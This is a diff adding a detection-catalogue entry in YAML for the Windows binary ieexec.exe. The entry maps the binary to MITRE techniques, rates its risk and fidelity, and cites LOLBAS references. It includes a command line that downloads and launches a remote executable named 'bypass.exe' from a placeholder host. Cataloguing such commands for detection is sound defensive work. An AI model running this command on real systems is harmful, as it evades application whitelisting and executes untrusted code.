@@ -1,0 +1,22 @@
+- command: ieexec.exe http://x.x.x.x:8080/bypass.exe
+  description: Abuse ieexec.exe to download and launch a remotely hosted .NET framework application.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+    Defense Evasion:
+      - T1218
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Ieexec/
+    - https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
+  risk: High
+  risk_reason: Use of this binary with a remote destination is a highly suspicious activity.
+  fidelity: High
+  fidelity_reason: Use of this binary in most organizations will be extremely rare.
+  tool: ieexec
+  threatactors:
+    N/A:
+      - N/A
